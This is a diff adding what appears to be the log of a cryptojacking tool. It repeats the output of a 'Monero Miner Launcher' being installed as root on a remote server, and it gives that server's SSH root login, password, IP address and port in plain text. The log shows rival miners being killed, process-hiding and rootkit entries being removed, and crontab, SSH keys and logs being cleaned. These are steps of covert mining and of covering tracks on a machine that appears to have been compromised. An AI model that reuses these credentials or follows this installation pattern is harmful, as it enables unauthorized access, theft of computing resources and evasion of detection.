@@ -1,0 +1,252 @@
+╔═══════════════════════════════════════════════════════════════╗
+║ Generated with Scanner v3.9.5-SSH-BANNER-CHECK                            ║
+║ Generated at: 2026-11-21 10:59:16                          ║
+╚═══════════════════════════════════════════════════════════════╝
+
+
+============================================================
+[INSTALL LOG] SSH://root:55Marko55@212.227.165.247:55555
+
+[SUCCESS] ✅ INSTALLATION SUCCESSFULLY COMPLETED!
+============================================================
+==========================================
+MONERO MINER LAUNCHER
+==========================================
+Script: setup_m0_launcher
+Version: 6.3
+Build Date: 2026-10-25 08:18:00 UTC
+==========================================
+
+[*] Detected OS: Linux
+[*] Proceeding with Linux/UNIX setup
+
+[✓] Running as root - full installation mode
+
+[*] Detected init system: systemd
+========================================
+FULL CLEAN INSTALLATION MODE
+========================================
+[*] Starting complete cleanup...
+[*] Cleaning up old libprocesshider entries...
+[✓] Old libprocesshider entries cleaned
+[*] Force-stopping services: swapd gdm2 moneroocean_miner
+[*] Force-stopping processes: xmrig swapd gdm2 monero minerd cpuminer
+[✓] All services/processes stopped!
+[*] Removing miner directories...
+[*] Cleaning services...
+[*] Cleaning crontab...
+[*] Cleaning profiles...
+[*] Cleaning SSH keys...
+[*] Removing kernel rootkits...
+[*] Cleaning logs...
+[✓] Cleanup complete
+
+
+========================================
+CHECKING DPKG STATUS
+========================================
+[!] DPKG may have been interrupted (old status file exists)
+
+[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY
+========================================
+[*] Checking for stuck dpkg processes...
+
+============================================================
+
+
+============================================================
+
+[SUCCESS] ✅ INSTALLATION SUCCESSFULLY COMPLETED!
+============================================================
+==========================================
+MONERO MINER LAUNCHER
+==========================================
+Script: setup_m0_launcher
+Version: 6.3
+Build Date: 2026-10-25 08:18:00 UTC
+==========================================
+
+[*] Detected OS: Linux
+[*] Proceeding with Linux/UNIX setup
+
+[✓] Running as root - full installation mode
+
+[*] Detected init system: systemd
+========================================
+FULL CLEAN INSTALLATION MODE
+========================================
+[*] Starting complete cleanup...
+[*] Cleaning up old libprocesshider entries...
+[✓] Old libprocesshider entries cleaned
+[*] Force-stopping services: swapd gdm2 moneroocean_miner
+[*] Force-stopping processes: xmrig swapd gdm2 monero minerd cpuminer
+[✓] All services/processes stopped!
+[*] Removing miner directories...
+[*] Cleaning services...
+[*] Cleaning crontab...
+[*] Cleaning profiles...
+[*] Cleaning SSH keys...
+[*] Removing kernel rootkits...
+[*] Cleaning logs...
+[✓] Cleanup complete
+
+
+========================================
+CHECKING DPKG STATUS
+========================================
+[!] DPKG may have been interrupted (old status file exists)
+
+[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY
+========================================
+[*] Checking for stuck dpkg processes...
+
+============================================================
+
+
+============================================================
+
+[SUCCESS] ✅ INSTALLATION SUCCESSFULLY COMPLETED!
+============================================================
+==========================================
+MONERO MINER LAUNCHER
+==========================================
+Script: setup_m0_launcher
+Version: 6.3
+Build Date: 2026-10-25 08:18:00 UTC
+==========================================
+
+[*] Detected OS: Linux
+[*] Proceeding with Linux/UNIX setup
+
+[✓] Running as root - full installation mode
+
+[*] Detected init system: systemd
+========================================
+FULL CLEAN INSTALLATION MODE
+========================================
+[*] Starting complete cleanup...
+[*] Cleaning up old libprocesshider entries...
+[✓] Old libprocesshider entries cleaned
+[*] Force-stopping services: swapd gdm2 moneroocean_miner
+[*] Force-stopping processes: xmrig swapd gdm2 monero minerd cpuminer
+[✓] All services/processes stopped!
+[*] Removing miner directories...
+[*] Cleaning services...
+[*] Cleaning crontab...
+[*] Cleaning profiles...
+[*] Cleaning SSH keys...
+[*] Removing kernel rootkits...
+[*] Cleaning logs...
+[✓] Cleanup complete
+
+
+========================================
+CHECKING DPKG STATUS
+========================================
+[!] DPKG may have been interrupted (old status file exists)
+
+[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY
+========================================
+[*] Checking for stuck dpkg processes...
+
+============================================================
+
+
+============================================================
+
+[SUCCESS] ✅ INSTALLATION SUCCESSFULLY COMPLETED!
+============================================================
+==========================================
+MONERO MINER LAUNCHER
+==========================================
+Script: setup_m0_launcher
+Version: 6.3
+Build Date: 2026-10-25 08:18:00 UTC
+==========================================
+
+[*] Detected OS: Linux
+[*] Proceeding with Linux/UNIX setup
+
+[✓] Running as root - full installation mode
+
+[*] Detected init system: systemd
+========================================
+FULL CLEAN INSTALLATION MODE
+========================================
+[*] Starting complete cleanup...
+[*] Cleaning up old libprocesshider entries...
+[✓] Old libprocesshider entries cleaned
+[*] Force-stopping services: swapd gdm2 moneroocean_miner
+[*] Force-stopping processes: xmrig swapd gdm2 monero minerd cpuminer
+[✓] All services/processes stopped!
+[*] Removing miner directories...
+[*] Cleaning services...
+[*] Cleaning crontab...
+[*] Cleaning profiles...
+[*] Cleaning SSH keys...
+[*] Removing kernel rootkits...
+[*] Cleaning logs...
+[✓] Cleanup complete
+
+
+========================================
+CHECKING DPKG STATUS
+========================================
+[!] DPKG may have been interrupted (old status file exists)
+
+[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY
+========================================
+[*] Checking for stuck dpkg processes...
+
+============================================================
+
+
+============================================================
+[INSTALL LOG] SSH://root:55Marko55@212.227.165.247:55555
+
+[SUCCESS] ✅ INSTALLATION SUCCESSFULLY COMPLETED!
+============================================================
+==========================================
+MONERO MINER LAUNCHER
+==========================================
+Script: setup_m0_launcher
+Version: 6.3
+Build Date: 2026-10-25 08:18:00 UTC
+==========================================
+
+[*] Detected OS: Linux
+[*] Proceeding with Linux/UNIX setup
+
+[✓] Running as root - full installation mode
+
+[*] Detected init system: systemd
+========================================
+FULL CLEAN INSTALLATION MODE
+========================================
+[*] Starting complete cleanup...
+[*] Cleaning up old libprocesshider entries...
+[✓] Old libprocesshider entries cleaned
+[*] Force-stopping services: swapd gdm2 moneroocean_miner
+[*] Force-stopping processes: xmrig swapd gdm2 monero minerd cpuminer
+[✓] All services/processes stopped!
+[*] Removing miner directories...
+[*] Cleaning services...
+[*] Cleaning crontab...
+[*] Cleaning profiles...
+[*] Cleaning SSH keys...
+[*] Removing kernel rootkits...
+[*] Cleaning logs...
+[✓] Cleanup complete
+
+
+========================================
+CHECKING DPKG STATUS
+========================================
+[!] DPKG may have been interrupted (old status file exists)
+
+[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY
+========================================
+[*] Checking for stuck dpkg processes...
+
+============================================================
+
